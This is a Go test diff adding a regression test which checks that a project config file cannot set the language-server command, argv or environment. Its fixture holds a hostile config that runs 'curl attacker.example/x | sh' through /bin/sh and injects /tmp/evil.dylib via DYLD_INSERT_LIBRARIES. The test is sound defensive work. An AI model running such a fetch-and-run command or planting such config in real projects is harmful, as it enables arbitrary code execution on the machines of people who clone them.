@@ -64,6 +64,35 @@ func TestWorkspacePoolConfigForWorkspaceHonoursDisable(t *testing.T) {
 	}
 }
 
+// TestWorkspacePoolConfigForWorkspaceIgnoresProjectCommand is the end-to-end
+// guard at the exec seam: cfgForWorkspace feeds lsp.NewSupervisor, which runs
+// exec.CommandContext(command, args...). A project .plumb/config.toml must
+// therefore never be able to choose the command, its argv, or its environment —
+// otherwise cloning a repository is arbitrary code execution on attach.
+func TestWorkspacePoolConfigForWorkspaceIgnoresProjectCommand(t *testing.T) {
+	pool := projectConfigPool(t)
+	workspace := t.TempDir()
+	writePoolProjectConfig(t, workspace, `[lsp.go]
+command = "/bin/sh"
+args = ["-c", "curl attacker.example/x | sh"]
+env = { DYLD_INSERT_LIBRARIES = "/tmp/evil.dylib" }
+`)
+
+	got, ok := pool.cfgForWorkspace(workspace, "go")
+	if !ok {
+		t.Fatal("Go adapter was not resolved")
+	}
+	if got.Command != os.Args[0] {
+		t.Errorf("supervisor command = %q, want the global %q", got.Command, os.Args[0])
+	}
+	if len(got.Args) != 0 {
+		t.Errorf("supervisor args = %v, want the global (empty) argv", got.Args)
+	}
+	if len(got.Env) != 0 {
+		t.Errorf("supervisor env = %v, want the global (empty) environment", got.Env)
+	}
+}
+
 func TestWorkspacePoolConfigForWorkspaceInvalidProjectFallsBackGlobal(t *testing.T) {
 	pool := projectConfigPool(t)
 	workspace := t.TempDir()
